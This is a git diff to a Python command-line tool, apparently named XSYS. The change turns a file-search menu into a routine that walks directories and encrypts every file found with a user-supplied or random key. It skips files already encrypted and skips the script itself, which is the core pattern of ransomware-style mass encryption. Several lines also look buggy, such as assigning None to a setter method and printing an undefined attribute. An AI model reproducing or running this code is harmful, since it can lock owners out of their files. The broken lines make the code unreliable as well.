@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 __author__ = "T0x1cEnv31ope"
 import os
+import sys
 import platform
 from src.main.xsys.core.XSYS import XSYS
 
@@ -38,14 +39,35 @@ class Menu(XSYS, object):
             elif len(main_choice) > 1:
                 main_choice = main_choice[:len(main_choice)-len(main_choice)+1]
             hex_m_choice = hex(ord(main_choice.lower()))
+            #check key choice
+            key_choice = input('[!] Would you like to generate a random 16-byte encryption key?\n[Y/n] ')
+            if len(key_choice) > 1:
+                key_choice = key_choice[:len(key_choice) - len(key_choice) + 1]
+            # check the choice
+            if key_choice.lower().__eq__('y'):
+                self.set_hash_key = None
+                print('[HASH KEY : {0}]'.format(self.hashkey))
+            elif key_choice.lower().__eq__('n'):
+                key_input = input('[$] insert a sixteen byte phrase!\n[Exp.] "sixteen byte key"\n[>] ')
+                if not len(key_input).__eq__(16):
+                    print('[!] Phrase must be 16 byte long!')
+                    break
+                else:
+                    self.set_hash_key(key_input)
+                    print('[HASH KEY : {0}]'.format(self.get_hash_key))
+                continue
+            else:
+                print('\n'.format(key_choice))
+                self.clear_console()
+                continue
             # hex(dec("e")) = 0x65
             if hex_m_choice.__eq__(self.get_hex_e):
                 self.clear_console()
-                self.input_handler()
+                self.input_handler(self.get_hash_key)
             # hex(dec("d")) = 0x64
             elif hex_m_choice.__eq__(self.get_hex_d):
                 self.clear_console()
-                self.input_handler()
+                self.input_handler(self.get_hash_key)
             else:
                 print('[!] "{0}" is not supported choice..!'.format(hex_m_choice))
                 self.clear_console()
@@ -56,8 +78,9 @@ class Menu(XSYS, object):
         input_handler
         - This method responsible to
         handle the input received by the user.
+        :param -> signature_key:str - a given key to be used as encryption key 
     """
-    def input_handler(self):
+    def input_handler(self, signature_key):
         enc_choice = input('\n[?] Which search operation would you prefer? \
                                               \n\tR -> Recursive \
                                               \n\tL -> Linear\n[$] ')
@@ -77,7 +100,13 @@ class Menu(XSYS, object):
             cntr = 0
             for file in rtar_files:
                 cntr += 1
-                print('[{0}] {1}'.format(cntr, file))
+                # print('[{0}] {1}'.format(cntr, file))
+                if os.path.basename(file).startswith(self.get_suffix):
+                    print('[!] "{0}" is already encrypted'.format(file))
+                elif file.__eq__(os.path.join(os.getcwd(), sys.argv[0])):
+                    pass
+                else:
+                    self.encrypt(self.produce_sha256_key(signature_key), str.format(file))
         # hex(dec("l")) = 0x6c
         elif hex_e_choice.__eq__(self.get_hex_l):
             print('\n[+] Current Location: {0}'.format(os.getcwd()))
@@ -92,7 +121,8 @@ class Menu(XSYS, object):
             cntr = 0
             for file in ltar_files:
                 cntr += 1
-                print('[{0}] {1}'.format(cntr, file))
+                # print('[{0}] {1}'.format(cntr, file))
+                self.encrypt(self.produce_sha256_key(signature_key), str.format(file))
             print('[&] Search took {1} seconds\n[&] Found {0} files'.format(len(ltar_files), res))
         else:
             print('[!] "{0}" is not supported choice..!'.format(hex_e_choice))
